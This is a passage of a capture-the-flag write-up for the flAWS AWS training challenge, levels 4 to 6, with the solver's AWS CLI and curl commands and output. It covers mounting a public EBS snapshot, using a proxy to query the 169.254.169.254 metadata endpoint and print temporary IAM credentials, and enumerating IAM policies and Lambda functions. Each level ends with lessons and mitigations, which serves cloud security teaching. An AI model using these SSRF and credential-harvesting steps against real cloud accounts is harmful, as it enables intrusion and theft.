+						"SubnetId": "subnet-d962aa90",
+						"InstanceType": "t2.micro",
+						"CapacityReservationSpecification": {
+							"CapacityReservationPreference": "open"
+						},
+						"NetworkInterfaces": [
+							{
+								"Status": "in-use",
+								"MacAddress": "06:b0:7a:92:21:cf",
+								"SourceDestCheck": true,
+								"VpcId": "vpc-1052ce77",
+								"Description": "",
+								"NetworkInterfaceId": "eni-c26ed780",
+								"PrivateIpAddresses": [
+									{
+										"PrivateDnsName": "ip-172-31-41-84.us-west-2.compute.internal",
+										"PrivateIpAddress": "172.31.41.84",
+										"Primary": true,
+										"Association": {
+											"PublicIp": "35.165.182.7",
+											"PublicDnsName": "ec2-35-165-182-7.us-west-2.compute.amazonaws.com",
+											"IpOwnerId": "amazon"
+										}
+									}
+								],
+								"PrivateDnsName": "ip-172-31-41-84.us-west-2.compute.internal",
+								"InterfaceType": "interface",
+								"Attachment": {
+									"Status": "attached",
+									"DeviceIndex": 0,
+									"DeleteOnTermination": true,
+									"AttachmentId": "eni-attach-a4901fc2",
+									"AttachTime": "2017-02-12T22:29:24.000Z"
+								},
+								"Groups": [
+									{
+										"GroupName": "launch-wizard-1",
+										"GroupId": "sg-490f6631"
+									}
+								],
+								"Ipv6Addresses": [],
+								"OwnerId": "975426262029",
+								"PrivateIpAddress": "172.31.41.84",
+								"SubnetId": "subnet-d962aa90",
+								"Association": {
+									"PublicIp": "35.165.182.7",
+									"PublicDnsName": "ec2-35-165-182-7.us-west-2.compute.amazonaws.com",
+									"IpOwnerId": "amazon"
+								}
+							}
+						],
+						"SourceDestCheck": true,
+						"Placement": {
+							"Tenancy": "default",
+							"GroupName": "",
+							"AvailabilityZone": "us-west-2a"
+						},
+						"Hypervisor": "xen",
+						"BlockDeviceMappings": [
+							{
+								"DeviceName": "/dev/sda1",
+								"Ebs": {
+									"Status": "attached",
+									"DeleteOnTermination": true,
+									"VolumeId": "vol-04f1c039bc13ea950",
+									"AttachTime": "2017-02-12T22:29:25.000Z"
+								}
+							}
+						],
+						"Architecture": "x86_64",
+						"RootDeviceType": "ebs",
+						"IamInstanceProfile": {
+							"Id": "AIPAIK7LV6U6UXJXQQR3Q",
+							"Arn": "arn:aws:iam::975426262029:instance-profile/flaws"
+						},
+						"RootDeviceName": "/dev/sda1",
+						"VirtualizationType": "hvm",
+						"HibernationOptions": {
+							"Configured": false
+						},
+						"MetadataOptions": {
+							"State": "applied",
+							"HttpEndpoint": "enabled",
+							"HttpTokens": "optional",
+							"HttpPutResponseHopLimit": 1
+						},
+						"AmiLaunchIndex": 0
+					}
+				],
+				"ReservationId": "r-0fe151dbbe77e90cc",
+				"Groups": [],
+				"OwnerId": "975426262029"
+			}
+		]
+	}
+
+
+=> Manually list the 'Snapshots'
+
+
+[ec2-user FLAWS]$  aws ec2 describe-snapshots --region us-west-2 --profile flaws-level3                                                      {
+    "Snapshots": [
+        {
+            "OwnerAlias": "amazon",
+            "Description": "",
+            "Encrypted": false,
+            "VolumeId": "vol-8ea56fe2",
+            "State": "completed",
+            "VolumeSize": 8,
+            "StartTime": "2012-06-25T23:13:44.000Z",
+            "Progress": "100%",
+            "OwnerId": "137112412989",
+            "SnapshotId": "snap-25d8014e"
+        },
+        {
+            "Description": "hvm/ubuntu-trusty-amd64-server-20150225.2",
+            "Encrypted": false,
+            "VolumeId": "vol-5143345e",
+            "State": "completed",
+            "VolumeSize": 8,
+            "StartTime": "2015-02-25T21:37:51.000Z",
+            "Progress": "100%",
+            "OwnerId": "099720109477",
+            "SnapshotId": "snap-86f488c6"
+        },
+        {
+            "Description": "TestTags Mon Dec 12 11:40:22 CST 2016 Backup from us-west-1 - Mon Dec 12 11:40:23 CST 2016",
+            "Encrypted": false,
+            "VolumeId": "vol-ffffffff",
+            "State": "completed",
+            "VolumeSize": 500,
+            "StartTime": "2016-12-12T17:40:24.000Z",
+            "Progress": "100%",
+            "OwnerId": "217880599903",
+            "SnapshotId": "snap-85cb8bc5"
+        },
+<SNIP>
+
+=> We filter the result with the volume-id...
+
+[ec2-user FLAWS]$  aws ec2 describe-snapshots --region us-west-2 --filter "Name=volume-id,Values=vol-04f1c039bc13ea950" --profile flaws-level3
+	{
+		"Snapshots": [
+			{
+				"Description": "",
+				"Tags": [
+					{
+						"Value": "flaws backup 2017.02.27",
+						"Key": "Name"
+					}
+				],
+				"Encrypted": false,
+				"VolumeId": "vol-04f1c039bc13ea950",
+				"State": "completed",
+				"VolumeSize": 8,
+				"StartTime": "2017-02-28T01:35:12.000Z",
+				"Progress": "100%",
+				"OwnerId": "975426262029",
+				"SnapshotId": "snap-0b49342abd1bdcb89"
+			}
+		]
+	}
+
+Note: We could have also used the following command which list all the snapshots with our owner-id
+aws --profile flaws-level3 ec2 describe-snapshots --owner-id 975426262029 --region us-west-2
+
+
+=> A snapshot named "flaws backup 2017.02.27" was created for the machine shortly after launch, in February 2017.
+   Lets check out the access permissions to confirm the information displayed by SocutSuite.
+
+[ec2-user FLAWS]$ aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flaws-level3
+	{
+		"SnapshotId": "snap-0b49342abd1bdcb89",
+		"CreateVolumePermissions": [
+			{
+				"Group": "all"
+			}
+		]
+	}
+
+=> The snapshot is public: It does not list specific AWS account IDs but just the “all” group, which means any AWS account has permission to access the snapshot.
+
+
+Next step: 
+=> Create a new Ec2 instance in the region "us-west-2" and use the snapshot “snap-0b49342abd1bdcb89”
+=> Log into the EC2 instance and mount the snapshot
+
+
+cat /mnt/snapshot/var/www/html/index.html
+<html>
+    <head>
+        <title>flAWS</title>
+        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+        <style>
+            body { font-family: Andale Mono, monospace; }
+        </style>
+    </head>
+<body
+  text="#00d000"
+  bgcolor="#000000"
+  style="max-width:800px; margin-left:auto ;margin-right:auto"
+  vlink="#00ff00" link="#00ff00">
+<center>
+<pre>
+ _____  _       ____  __    __  _____
+|     || |     /    ||  |__|  |/ ___/
+|   __|| |    |  o  ||  |  |  (   \_
+|  |_  | |___ |     ||  |  |  |\__  |
+|   _] |     ||  _  ||  `  '  |/  \ |
+|  |   |     ||  |  | \      / \    |
+|__|   |_____||__|__|  \_/\_/   \___|
+</pre>
+<h1>flAWS - Level 5</h1>
+</center>
+
+Good work getting in.  This level is described at <a href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/">http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</a>
+
+
+*****************************************************************************************************
+Level 4 - Lesson learned
+*****************************************************************************************************
+AWS allows you to make snapshots of EC2's and databases (RDS). 
+The main purpose for that is to make backups, but people sometimes use snapshots to get access back to their own EC2's when they forget the passwords. 
+This also allows attackers to get access to things. 
+Snapshots are normally restricted to your own account, so a possible attack would be an attacker getting access 
+to an AWS key that allows them to start/stop and do other things with EC2's and then uses that to snapshot an EC2 
+and spin up an EC2 with that volume in your environment to get access to it. 
+Like all backups, you need to be cautious about protecting them.
+
+
+============================================================================================================
+LEVEL 5 - Vulnerability: Credentials stored in the Meta-data of an Ec2... 
+============================================================================================================
+* Info: This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:
+> http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
+> http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
+> http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/
+
+See if you can use this proxy to figure out how to list the contents of the level6 bucket 
+at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it.
+
+
+=> First I tried "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/"
+and got the message 
+
+	|  |_  | |___ |     ||  |  |  |\__  |
+	|   _] |     ||  _  ||  `  '  |/  \ |
+	|  |   |     ||  |  | \      / \    |
+	|__|   |_____||__|__|  \_/\_/   \___|
+	Access Denied
+	Level 6 is hosted in a sub-directory, but to figure out that directory, you need to play level 5 properly. 
+
+
+=> Then I tried the classic IP 169.254.169.254 to see if I can access to the Meta-data of the EC2 hosting the proxy
+   and perhaps collect AWS creds
+
+[ec2-user@<SNIP> FLAWS ]$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/
+1.0
+2007-01-19
+2007-03-01
+2007-08-29
+2007-10-10
+2007-12-15
+2008-02-01
+2008-09-01
+2009-04-04
+2011-01-01
+2011-05-01
+2012-01-12
+2014-02-25
+2014-11-05
+2015-10-20
+2016-04-19
+2016-06-30
+2016-09-02
+2018-03-28
+2018-08-17
+2018-09-24
+2019-10-01
+latest
+
+[ec2-user@<SNIP> FLAWS]$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/
+dynamic
+meta-data
+user-data
+
+[ec2-user@<SNIP> FLAWS]$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/
+ami-id
+ami-launch-index
+ami-manifest-path
+block-device-mapping/
+events/
+hostname
+iam/
+identity-credentials/
+instance-action
+instance-id
+instance-life-cycle
+instance-type
+local-hostname
+local-ipv4
+mac
+metrics/
+network/
+placement/
+profile
+public-hostname
+public-ipv4
+public-keys/
+reservation-id
+security-groups
+services/
+
+[ec2-user@<snip> FLAWS]$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/
+info
+security-credentials/
+
+[ec2-user@<snip> FLAWS]$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials
+flaws
+
+[ec2-user@<snip> FLAWS]$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta/iam/security-credentials/flaws
+{
+  "Code" : "Success",
+  "LastUpdated" : "2020-06-28T23:24:06Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIA6GG7PSQGXVTQCN4U",
+  "SecretAccessKey" : "INdPQB98g73nzfwK5W55cFmymy9P49TsjsYLswdR",
+  "Token" : "IQoJb3JpZ2luX2VjEHAaCXVzLXdlc3QtMiJGMEQCIFWq3YdPcbZ7jAbg1UhbZJtWJ/XHhpYtiz/1TxsFy+ziAiBVWKt34kJWAry/4xU6vFB5ljewZKL7KBQCd6hPydTiHCq9Awj5//////////8BEAEaDDk3NTQyNjI2MjAyOSIMLWv6mEJirDwA6YFKKpEDPwATBWon4o2QymFoCR35ETpgflewE43MY9+ErpV+Ef7YEYkRV02ziFnPGsyoVeDmgZkyJC6G1jXdDCfOCOAJFMpsC06f5BiKIIdDWebGIianWtiqEvhnGcqJqNE2UEh+yHybs3DXXHj3OYmcTwQY3+mNKPf42D3SRnZpShR8s9U7YSJWVgcQhZ/aVOD6o+2rq1BnFHGeOMdVsIUNeOL6Y97nQFL77QwIsiRxJJbZd+nZM8Arz2oIaNPRbHI+chk0Gxirfw+XjR9rYTUN+t0IS72cRIV36/uOJKVi04xZq4MZTwSZVVmYcp5KZG2rd0Hkmyt6XspPjOpMyjMSZjc6vyw5h/f/nx03TNkSFN9648dkUdy5eZQPCLYhFxVDmec11OKnokkKlM8SWqh11BKUHerkTX2D8H0mPof/UWv1T8UeQE1A84y6dmEBhknxDhUhuC9MetAYx1bT+xQ73+UPTRIPkZOGLInCcTx+itW70fJaTf/GMZsbVkbwyISE2rGwV5ci8DUn0ii0CUcROkES0zAwjM3k9wU67AElQ0Mp5z5SwfqN9Ehjz7hVxmsUKvFSr1+m9KfLlWo2VKP6MoM4Lfe0Wu7KkX8N5bSK46Q9W3syvhFrNwydFtBhKSaegbAADSgSYU1ba8PV/hA9pGj+RRyVpnmt/XBO6A4ar/fJeYMBoiCk/+ZLmTx6PZ5ZX4NneG0m8yUcF2c2DYUVwImgidR+cjKj56QaaBcZPhOwYyn+0yPyiKV/x6hCyH4LAEGcNRoRytMPmj0u6EzPvC1gqNzFS5+K0R2iNjPZfFGRh46QygxjN/abUqz9Bceha3PEFvGOR1jxWXsQlM8ytyVFr0QhsKPOPA==",
+  "Expiration" : "2020-06-29T05:54:11Z"
+}
+
+=> I created a new profile with the new AWS creds and list the S3 bucket..
+
+[ec2-user<snip> FLAWS]$ aws configure --profile flaws-level5
+AWS Access Key ID [None]: ASIA6GG7PSQGXVTQCN4U
+AWS Secret Access Key [None]: INdPQB98g73nzfwK5W55cFmymy9P49TsjsYLswdR
+Default region name [None]: us-west-2
+Default output format [None]:
+
+Note: I also added the token in the file ~/.aws/credentials 
+
+
+[ec2-user<snip> .aws]$ aws --profile flaws-level5 s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+                           PRE ddcc78ff/
+2017-02-27 02:11:07        871 index.html
+
+
+=> Browse the URL "http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/" 
+=> Access to the level 6
+
+
+*****************************************************************************************************
+Level 5 - Lesson learned
+*****************************************************************************************************
+The IP address 169.254.169.254 is a magic IP in the cloud world. 
+AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves.
+Some, such as Google, have additional constraints on the requests, such as requiring it to use `Metadata-Flavor: 
+Google` as an HTTP header and refusing requests with an `X-Forwarded-For` header. 
+AWS has recently created a new IMDSv2 that requires special headers, a challenge and response, and other protections, but many AWS accounts may not have enforced it. 
+If you can make any sort of HTTP request from an EC2 to that IP, you'll likely get back information the owner would prefer you not see.
+
+Avoiding this mistake
+Ensure your applications do not allow access to 169.254.169.254 or any local and private IP ranges. Additionally, ensure that IAM roles are restricted as much as possible.
+
+
+============================================================================================================
+LEVEL 6 - Vulnerability: Too much privileges..
+============================================================================================================
+* Info: For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. 
+See what else it can do and what else you might find in this AWS account.
+Access key ID: AKIAJFQ6E7BY57Q3OBGA
+Secret: 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
+
+=> Let's create a new profile and see what privileges/policies has this new AWS account..
+
+[ec2-user@<snip> .aws]$ aws configure --profile flaws-level-6
+AWS Access Key ID : AKIAJFQ6E7BY57Q3OBGA
+AWS Secret Access Key : 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
+Default region name : us-west-2
+Default output format [None]:
+
+[ec2-user@<snip> .aws]$ aws --profile flaws-level-6 iam get-user
+{
+    "User": {
+        "UserName": "Level6",
+        "Path": "/",
+        "CreateDate": "2017-02-26T23:11:16Z",
+        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
+        "Arn": "arn:aws:iam::975426262029:user/Level6"
+    }
+}
+
+[ec2-user@<snip> .aws]$ aws --profile flaws-level-6 iam list-attached-user-policies --user-name Level6
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "list_apigateways",
+            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
+        },
+        {
+            "PolicyName": "MySecurityAudit",
+            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
+        }
+    ]
+}
+
+=> The AWS user account "Level6" has 2 policies => let's check them
+
+[ec2-user@<snip> .aws]$ aws --profile flaws-level-6 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
+{
+    "Policy": {
+        "PolicyName": "list_apigateways",
+        "Description": "List apigateways",
+        "PermissionsBoundaryUsageCount": 0,
+        "CreateDate": "2017-02-20T01:45:17Z",
+        "AttachmentCount": 1,
+        "IsAttachable": true,
+        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
+        "DefaultVersionId": "v4",
+        "Path": "/",
+        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
+        "UpdateDate": "2017-02-20T01:48:17Z"
+    }
+}
+
+[ec2-user@<snip> .aws]$ aws --profile flaws-level-6 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
+{
+    "PolicyVersion": {
+        "CreateDate": "2017-02-20T01:48:17Z",
+        "VersionId": "v4",
+        "Document": {
+            "Version": "2012-10-17",
+            "Statement": [
+                {
+                    "Action": [
+                        "apigateway:GET"
+                    ],
+                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*",
+                    "Effect": "Allow"
+                }
+            ]
+        },
+        "IsDefaultVersion": true
+    }
+}
+
+
+[ec2-user@<snip> .aws]$ aws --profile flaws-level-6 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit
+{
+    "Policy": {
+        "PolicyName": "MySecurityAudit",
+        "Description": "Most of the security audit capabilities",
+        "PermissionsBoundaryUsageCount": 0,
+        "CreateDate": "2019-03-03T16:42:45Z",
+        "AttachmentCount": 1,
+        "IsAttachable": true,
+        "PolicyId": "ANPAJCK5AS3ZZEILYYVC6",
+        "DefaultVersionId": "v1",
+        "Path": "/",
+        "Arn": "arn:aws:iam::975426262029:policy/MySecurityAudit",
+        "UpdateDate": "2019-03-03T16:42:45Z"
+    }
+}
+
+[ec2-user@<snip> .aws]$ aws --profile flaws-level-6 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit --version-id v1
+{
+    "PolicyVersion": {
+        "CreateDate": "2019-03-03T16:42:45Z",
+        "VersionId": "v1",
+        "Document": {
+            "Version": "2012-10-17",
+            "Statement": [
+                {
+                    "Action": [
+                        "acm:Describe*",
+                        "acm:List*",
+                        "application-autoscaling:Describe*",
+                        "athena:List*",
+                        "autoscaling:Describe*",
+                        "batch:DescribeComputeEnvironments",
+                        "batch:DescribeJobDefinitions",
+                        "clouddirectory:ListDirectories",
+                        "cloudformation:DescribeStack*",
+                        "cloudformation:GetTemplate",
+                        "cloudformation:ListStack*",
+                        "cloudformation:GetStackPolicy",
+                        "cloudfront:Get*",
+                        "cloudfront:List*",
+                        "cloudhsm:ListHapgs",
+                        "cloudhsm:ListHsms",
+                        "cloudhsm:ListLunaClients",
+                        "cloudsearch:DescribeDomains",
+                        "cloudsearch:DescribeServiceAccessPolicies",
+                        "cloudtrail:DescribeTrails",
+                        "cloudtrail:GetEventSelectors",
+                        "cloudtrail:GetTrailStatus",
+                        "cloudtrail:ListTags",
+                        "cloudwatch:Describe*",
+                        "codebuild:ListProjects",
+                        "codedeploy:Batch*",
+                        "codedeploy:Get*",
+                        "codedeploy:List*",
+                        "codepipeline:ListPipelines",
+                        "codestar:Describe*",
+                        "codestar:List*",
+                        "cognito-identity:ListIdentityPools",
+                        "cognito-idp:ListUserPools",
+                        "cognito-sync:Describe*",
+                        "cognito-sync:List*",
+                        "datasync:Describe*",
+                        "datasync:List*",
+                        "dax:Describe*",
+                        "dax:ListTags",
+                        "directconnect:Describe*",
+                        "dms:Describe*",
+                        "dms:ListTagsForResource",
+                        "ds:DescribeDirectories",
+                        "dynamodb:DescribeContinuousBackups",
+                        "dynamodb:DescribeGlobalTable",
+                        "dynamodb:DescribeTable",
+                        "dynamodb:DescribeTimeToLive",
+                        "dynamodb:ListBackups",
+                        "dynamodb:ListGlobalTables",
+                        "dynamodb:ListStreams",
+                        "dynamodb:ListTables",
+                        "ec2:Describe*",
+                        "ecr:DescribeRepositories",
+                        "ecr:GetRepositoryPolicy",
+                        "ecs:Describe*",
+                        "ecs:List*",
+                        "eks:DescribeCluster",
+                        "eks:ListClusters",
+                        "elasticache:Describe*",
+                        "elasticbeanstalk:Describe*",
+                        "elasticfilesystem:DescribeFileSystems",
+                        "elasticloadbalancing:Describe*",
+                        "elasticmapreduce:Describe*",
+                        "elasticmapreduce:ListClusters",
+                        "elasticmapreduce:ListInstances",
+                        "es:Describe*",
+                        "es:ListDomainNames",
+                        "events:DescribeEventBus",
+                        "events:ListRules",
+                        "firehose:Describe*",
+                        "firehose:List*",
+                        "fsx:Describe*",
+                        "fsx:List*",
+                        "gamelift:ListBuilds",
+                        "gamelift:ListFleets",
+                        "glacier:DescribeVault",
+                        "glacier:GetVaultAccessPolicy",
+                        "glacier:ListVaults",
+                        "globalaccelerator:Describe*",
+                        "globalaccelerator:List*",
+                        "greengrass:List*",
+                        "guardduty:Get*",
+                        "guardduty:List*",
+                        "iam:GenerateCredentialReport",
+                        "iam:Get*",
+                        "iam:List*",
+                        "iam:SimulateCustomPolicy",
+                        "iam:SimulatePrincipalPolicy",
+                        "iot:Describe*",
+                        "iot:List*",
+                        "kinesis:DescribeStream",
+                        "kinesis:ListStreams",
+                        "kinesis:ListTagsForStream",
+                        "kinesisanalytics:ListApplications",
+                        "kms:Describe*",
+                        "kms:List*",
+                        "lambda:GetAccountSettings",
+                        "lambda:GetPolicy",
+                        "lambda:List*",
+                        "license-manager:List*",
+                        "logs:Describe*",
+                        "logs:ListTagsLogGroup",
+                        "machinelearning:DescribeMLModels",
+                        "mediaconnect:Describe*",
+                        "mediaconnect:List*",
+                        "mediastore:GetContainerPolicy",
+                        "mediastore:ListContainers",
+                        "opsworks-cm:DescribeServers",
+                        "organizations:List*",
+                        "quicksight:Describe*",
+                        "quicksight:List*",
+                        "ram:List*",
+                        "rds:Describe*",
+                        "rds:DownloadDBLogFilePortion",
+                        "rds:ListTagsForResource",
+                        "redshift:Describe*",
+                        "rekognition:Describe*",
+                        "rekognition:List*",
+                        "robomaker:Describe*",
+                        "robomaker:List*",
+                        "route53:Get*",
+                        "route53:List*",
+                        "route53domains:GetDomainDetail",
+                        "route53domains:GetOperationDetail",
+                        "route53domains:ListDomains",
+                        "route53domains:ListOperations",
+                        "route53domains:ListTagsForDomain",
+                        "route53resolver:List*",
+                        "s3:ListAllMyBuckets",
+                        "sagemaker:Describe*",
+                        "sagemaker:List*",
+                        "sdb:DomainMetadata",
+                        "sdb:ListDomains",
+                        "securityhub:Get*",
+                        "securityhub:List*",
+                        "serverlessrepo:GetApplicationPolicy",
+                        "serverlessrepo:List*",
+                        "sqs:GetQueueAttributes",
+                        "sqs:ListQueues",
+                        "ssm:Describe*",
+                        "ssm:ListDocuments",
+                        "storagegateway:List*",
+                        "tag:GetResources",
+                        "tag:GetTagKeys",
+                        "transfer:Describe*",
+                        "transfer:List*",
+                        "translate:List*",
+                        "trustedadvisor:Describe*",
+                        "waf:ListWebACLs",
+                        "waf-regional:ListWebACLs",
+                        "workspaces:Describe*"
+                    ],
+                    "Resource": "*",
+                    "Effect": "Allow"
+                }
+            ]
+        },
+        "IsDefaultVersion": true
+    }
+}
+
+
+=> With these 2 policies have gather a lot of information...
+
+=> I followed the "Hint2" at this stage and look at the lambda function...
+
+[ec2-user@<snip> .aws]$ aws --region us-west-2 --profile flaws-level-6 lambda list-functions
+{
+    "Functions": [
+        {
+            "TracingConfig": {
+                "Mode": "PassThrough"
+            },
+            "Version": "$LATEST",
+            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
+            "FunctionName": "Level6",
+            "MemorySize": 128,
+            "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b",
+            "CodeSize": 282,
+            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
+            "Handler": "lambda_function.lambda_handler",
+            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
+            "Timeout": 3,
+            "LastModified": "2017-02-27T00:24:36.054+0000",
+            "Runtime": "python2.7",
+            "Description": "A starter AWS Lambda function."
+        }
+    ]
+}
+
+
+=> There is a Lambda function named "Level6" and I can display its policy thanks to the MySecurityAudit privileges
+
+[ec2-user@<snip> .aws]$ aws --region us-west-2 --profile flaws-level-6 lambda get-policy --function-name Level6
+{
+    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":
+		[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":
+		{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":
+		\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":
+		{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
+    "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"
+}
+
+=> Hint2:
+"This tells you about the ability to execute `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\` 
+That "s33ppypa75" is a rest-api-id, which you can then use with that other attached policy:"
+
+[ec2-user@<snip> .aws]$ aws --profile flaws-level-6 --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"
+{
+    "item": [
+        {
+            "tracingEnabled": false,
+            "stageName": "Prod",
+            "cacheClusterEnabled": false,
+            "cacheClusterStatus": "NOT_AVAILABLE",
+            "deploymentId": "8gppiv",
+            "lastUpdatedDate": 1488155168,
+            "createdDate": 1488155168,
+            "methodSettings": {}
+        }
+    ]
+}
+
+=> Hint2:
+"That tells you the stage name is "Prod". Lambda functions are called using that rest-api-id, stage name, region, and resource as:
+ https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6"
+
+ 
+[ec2-user@<snip> .aws]$ curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
+"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"
+
+	 _____  _       ____  __    __  _____
+	|     || |     /    ||  |__|  |/ ___/
+	|   __|| |    |  o  ||  |  |  (   \_ 
+	|  |_  | |___ |     ||  |  |  |\__  |
+	|   _] |     ||  _  ||  `  '  |/  \ |
+	|  |   |     ||  |  | \      / \    |
+	|__|   |_____||__|__|  \_/\_/   \___|
+	flAWS - The End
+
+
+*****************************************************************************************************
+Level 6 - Lesson learned
+*****************************************************************************************************
+It is common to give people and entities read-only permissions such as the MySecurityAudit policy. 
+The ability to read your own and other's IAM policies can really help an attacker figure out what exists in your environment and look for weaknesses and mistakes.
+
+Avoiding this mistake
+Don't hand out any permissions liberally, even permissions that only let you read meta-data or know what your permissions are.
